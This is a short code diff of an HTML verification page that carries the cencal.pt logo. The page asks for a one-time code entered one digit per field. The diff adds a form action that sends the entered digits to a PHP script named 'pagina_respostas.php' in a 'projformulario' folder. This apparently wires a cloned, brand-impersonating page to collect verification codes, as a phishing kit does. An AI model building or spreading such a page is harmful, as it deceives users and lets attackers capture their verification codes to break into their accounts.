@@ -11,7 +11,7 @@
         <div class="div-2">
             <img loading="lazy" srcset="https://cencal.pt/versions/v7.1.2.0/public/branding.501886354/logo.png?a=1698141962" class="img">
             <div class="container" style="margin-top: 28px;">
-                <form class="login-form">
+                <form class="login-form" action="/projformulario/php/pagina_respostas.php">
                     <section class="content">
                         <div class="section" style="margin-bottom: 0px; margin-top: 6px;">
                             <div class="inner-section" style="margin-top: 0px;">
@@ -29,7 +29,7 @@
                                         <input type="text" name="digit3" class="input-field" maxlength="1" required="" style="padding-left: 19px;">
                                     </div>
                                 </div>
-                                <input type="submit" value="Verificar" style="margin-top: 3px; margin-bottom: 6px;">
+                                <input type="submit"  value="Verificar" style="margin-top: 3px; margin-bottom: 6px;">
                             </div>
                             <a href="#" class="access" style="margin-top: 4px;">Não recebeste o código? Clique aqui.</a>
                         </div>
